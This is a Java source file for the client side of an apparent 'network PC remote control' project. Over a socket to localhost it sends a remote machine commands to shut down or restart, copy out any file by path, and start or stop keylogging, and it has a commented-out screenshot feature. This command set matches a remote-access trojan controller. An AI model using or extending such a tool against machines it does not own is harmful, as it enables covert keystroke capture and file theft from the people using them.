import java.awt.*;
import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.Scanner;

public class Client {
    public static void main(String[] args) {
        try {
            Socket socket = new Socket("localhost", 5000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            PrintWriter writer = new PrintWriter(socket.getOutputStream());

            Scanner sc = new Scanner(System.in);
            boolean exit = false;

            while (!exit) {
                System.out.println("\n MENU");
                System.out.println("0. Exit");
                System.out.println("1. Shutdown (After 15')");
                System.out.println("2. Restart (After 15')");
                System.out.println("3. Cancel Shutdown/ Restart");
                //System.out.println("4. Screenshot");
                System.out.println("5. Collect File (via user disk address)");
                System.out.println("6. Start keyLogging");
                System.out.println("7. Pause and Return keyLogging");

                int choice = sc.nextInt();
                sc.nextLine();

                switch (choice) {
                    case 0:
                        exit = true;
                        break;

                    case 1:
                        writer.println("shutdown");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 2:
                        writer.println("restart");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

                    case 3:
                        writer.println("cancel");
                        writer.flush();
                        System.out.println(reader.readLine());
                        break;

//                    case 4:
//                        writer.println("screenshot");
//                        writer.flush();
//
//                        int imageSize = Integer.parseInt(reader.readLine());
//                        byte[] imageBytes = new byte[imageSize];
//                        int byteReadImage = socket.getInputStream().read(imageBytes);
//
//                        if (byteReadImage > 0) {
//                            System.out.println("Insert image address & name: ");
//                            String imageAddress = sc.nextLine();
//                            Path imagePath = Paths.get(imageAddress + ".png");
//                            Files.write(imagePath, imageBytes);
//                            System.out.println("A new screenshot has been added to: " + imageAddress);
//                        }
//                        break;

                    case 5:
                        System.out.println("Insert the server path to the file: ");
                        String filePathServer = sc.nextLine();

                        writer.println("collect-" + filePathServer);
                        writer.flush();

                        int fileSize = Integer.parseInt(reader.readLine());
                        byte[] fileBytes = new byte[fileSize];

                        int totalBytesRead = 0;
                        int bytesReadThisTime;
                        while ((bytesReadThisTime = socket.getInputStream().read(fileBytes, totalBytesRead, fileBytes.length - totalBytesRead)) > 0) {
                            totalBytesRead += bytesReadThisTime;
                            if (totalBytesRead == fileSize) {
                                break;
                            }
                        }

                        if (totalBytesRead == fileSize) {
                            String fileAddress = "D:/Projects/network-pc-remote-control/remote-control/src/";
                            System.out.println("Insert file name: ");
                            String fileName = sc.nextLine();

                            Path filePathUserChecker = Paths.get(fileAddress);
                            Path filePathUser = Paths.get(fileAddress + fileName);

                            if (Files.isDirectory(filePathUserChecker.getParent()) && Files.isWritable(filePathUserChecker)) {
                                Files.write(filePathUser, fileBytes);
                                System.out.println("A new file has been added to: " + fileAddress);
                            } else {
                                System.out.println("Invalid file address or write permissions denied.");
                            }
                        } else {
                            System.out.println("Incomplete file transfer.");
                        }

                        break;

                    case 6:
                        writer.println("keylogging-start");
                        writer.flush();
                        break;

                    case 7:
                        writer.println("keylogging-end");
                        writer.flush();
                        break;

                    default:
                        throw new AssertionError();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
